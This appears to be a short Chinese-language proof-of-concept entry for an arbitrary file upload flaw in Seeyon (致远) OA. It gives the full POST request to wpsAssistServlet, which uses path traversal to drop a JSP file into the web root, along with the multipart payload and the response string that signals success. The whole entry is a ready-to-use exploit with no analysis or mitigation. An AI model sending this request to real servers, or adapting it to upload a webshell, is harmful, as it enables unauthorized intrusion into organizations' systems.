# 致远OA任意文件上传

致远OA ｜ 文件上传 ｜ —
- **请求**：`POST /seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/dude.jsp&fileId=1 HTTP/1.1`

**Payload**
```
--6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4
Content-Disposition: form-data; name="upload"; filename="deC08B.txt"
Content-Type: application/octet-stream
12345
--6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4--
```
- **响应特征**：-1 success